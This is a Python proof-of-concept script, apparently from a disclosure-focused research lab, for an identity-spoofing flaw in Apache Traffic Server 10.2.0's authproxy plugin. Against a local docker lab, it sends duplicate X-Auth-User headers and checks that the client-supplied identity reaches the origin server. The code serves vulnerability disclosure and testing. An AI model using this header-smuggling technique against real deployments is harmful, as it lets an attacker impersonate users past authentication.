#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-authproxy-prefix (High: 8.1)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: authproxy prefix duplicate header plants identity at origin
#  Requires: authproxy plugin with --forward-header-prefix
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-authproxy-prefix"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ATS 10.2.0 authproxy prefix duplicate X-Auth-User last-wins leftover."""

import os
import socket
import subprocess
from dataclasses import dataclass
from pathlib import Path

LABEL = "ats-authproxy-prefix"
WITNESS = "ATS-AUTHPROXY-PREFIX-WITNESS"
REALUSER = "realuser"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
ATS_HOST = "127.0.0.1"
ATS_PORT = 18760
ORIGIN_HOST = "127.0.0.1"
ORIGIN_PORT = 18761
AUTH_HOST = "127.0.0.1"
AUTH_PORT = 18762
MAP_HOST = "origin.lab"
TIMEOUT_S = 20.0
RECV_LIMIT = 1_048_576
PINNED_VERSION = "10.2.0"
PINNED_COMMIT = "b1df7334b39a878971c376da849e8da4984918b6"


@dataclass(frozen=True)
class HttpExchange:
    status: int
    reason: str
    body: str
    raw: bytes


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def raw_http(
    host: str,
    port: int,
    method: str,
    path: str,
    extra_headers: list[str],
    http_host: str,
) -> HttpExchange:
    lines = [
        f"{method} {path} HTTP/1.1",
        f"Host: {http_host}",
        "Connection: close",
        *extra_headers,
        "",
        "",
    ]
    request = "\r\n".join(lines).encode("ascii")
    with socket.create_connection((host, port), TIMEOUT_S) as sock:
        sock.settimeout(TIMEOUT_S)
        sock.sendall(request)
        chunks = bytearray()
        while len(chunks) < RECV_LIMIT:
            try:
                piece = sock.recv(65536)
            except (TimeoutError, socket.timeout):
                break
            if not piece:
                break
            chunks.extend(piece)
    raw = bytes(chunks)
    if not raw:
        raise ConnectionError("empty-http-response")
    header_blob, sep, body_blob = raw.partition(b"\r\n\r\n")
    if not sep:
        header_blob, _sep, body_blob = raw.partition(b"\n\n")
    status_line = header_blob.split(b"\r\n", 1)[0].split(b"\n", 1)[0]
    parts = status_line.decode("latin-1", errors="replace").split(" ", 2)
    if len(parts) < 2 or not parts[1].isdigit():
        raise ValueError(f"bad-status-line={status_line!r}")
    status = int(parts[1])
    reason = parts[2] if len(parts) > 2 else ""
    body = body_blob.decode("utf-8", errors="replace")
    return HttpExchange(status=status, reason=reason, body=body, raw=raw)


def ats_get(path: str, extra_headers: list[str]) -> HttpExchange:
    return raw_http(ATS_HOST, ATS_PORT, "GET", path, extra_headers, MAP_HOST)


def origin_hits() -> int:
    exchange = raw_http(ORIGIN_HOST, ORIGIN_PORT, "GET", "/_hits", [], f"{ORIGIN_HOST}:{ORIGIN_PORT}")
    for line in exchange.body.splitlines():
        if line.startswith("hits="):
            return int(line.split("=", 1)[1])
    raise ValueError(f"origin-hits-unparsed body={clip(exchange.body)!r}")


def summarize(name: str, exchange: HttpExchange) -> None:
    log(
        f"{name} status={exchange.status} reason={exchange.reason!r} "
        f"body={clip(exchange.body)!r}"
    )


def read_ats_version() -> str:
    proc = compose("exec", "-T", "ats", "traffic_server", "--version", timeout=30)
    text = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"ats-version rc={proc.returncode} out={clip(text, 320)!r}")
    return text


def plugin_present() -> bool:
    proc = compose(
        "exec",
        "-T",
        "ats",
        "test",
        "-f",
        "/opt/ats/libexec/trafficserver/authproxy.so",
        timeout=30,
    )
    return proc.returncode == 0


def body_has_witness(body: str) -> bool:
    return WITNESS in body


def body_realuser_only(body: str) -> bool:
    return "REALUSER-ONLY" in body and WITNESS not in body


def main() -> int:
    log(f"label={LABEL} target={ATS_HOST}:{ATS_PORT} host={MAP_HOST}")
    log(f"pin={PINNED_VERSION} commit={PINNED_COMMIT}")

    version = read_ats_version()
    if PINNED_VERSION not in version:
        return fail(f"ats-version-not-{PINNED_VERSION} got={clip(version)!r}")
    if not plugin_present():
        return fail("authproxy-so-missing")

    try:
        hits0 = origin_hits()
    except (OSError, ValueError) as exc:
        return fail(f"origin-hits-failed {exc}")
    log(f"origin-hits-start={hits0}")

    log("== CONTROL none: no client X-Auth-User ==")
    try:
        none = ats_get("/ok-none", [])
    except (OSError, ValueError) as exc:
        return fail(f"control-none-failed {exc}")
    summarize("control-none", none)
    if none.status != 200:
        return fail(f"control-none-status={none.status}")
    if not body_realuser_only(none.body):
        return fail("control-none-not-realuser-only")

    log("== CONTROL single: one client X-Auth-User overwritten ==")
    try:
        single = ats_get("/ok-single", [f"X-Auth-User: {WITNESS}"])
    except (OSError, ValueError) as exc:
        return fail(f"control-single-failed {exc}")
    summarize("control-single", single)
    if single.status != 200:
        return fail(f"control-single-status={single.status}")
    if not body_realuser_only(single.body):
        return fail("control-single-witness-survived")

    try:
        hits_before_deny = origin_hits()
    except (OSError, ValueError) as exc:
        return fail(f"origin-hits-before-deny-failed {exc}")
    log(f"origin-hits-before-deny={hits_before_deny}")

    log("== CONTROL 403: auth helper deny, origin not reached ==")
    try:
        denied = ats_get(
            "/deny",
            [
                f"X-Auth-User: {REALUSER}",
                f"X-Auth-User: {WITNESS}",
            ],
        )
    except (OSError, ValueError) as exc:
        return fail(f"control-403-failed {exc}")
    summarize("control-403", denied)
    if denied.status != 403:
        return fail(f"control-403-status={denied.status}")
    if body_has_witness(denied.body) or "REALUSER-ONLY" in denied.body:
        return fail("control-403-origin-body-leaked")
    try:
        hits_after_deny = origin_hits()
    except (OSError, ValueError) as exc:
        return fail(f"origin-hits-after-deny-failed {exc}")
    log(f"origin-hits-after-deny={hits_after_deny}")
    if hits_after_deny != hits_before_deny:
        return fail(f"control-403-origin-reached hits={hits_after_deny}")

    log("== POC duplicate X-Auth-User plant ==")
    try:
        planted = ats_get(
            "/ok-dup",
            [
                f"X-Auth-User: {REALUSER}",
                f"X-Auth-User: {WITNESS}",
            ],
        )
    except (OSError, ValueError) as exc:
        return fail(f"poc-dup-failed {exc}")
    summarize("poc-dup", planted)
    if planted.status != 200:
        return fail(f"poc-dup-status={planted.status}")
    if not body_has_witness(planted.body):
        return fail("poc-dup-missing-witness")
    if "REALUSER-ONLY" in planted.body and WITNESS not in planted.body:
        return fail("poc-dup-realuser-only")

    last_line = ""
    for line in planted.body.splitlines():
        if line.startswith("X-Auth-User-Last:"):
            last_line = line.split(":", 1)[1].strip()
            break
    log(f"poc-dup-last={last_line!r}")
    if last_line != WITNESS:
        return fail(f"poc-dup-last-not-witness last={last_line!r}")

    log(
        "SUCCESS "
        f"{LABEL} pin={PINNED_VERSION} control-none=REALUSER-ONLY "
        "control-single=REALUSER-ONLY control-403=yes dup-last-wins=yes "
        f"{WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

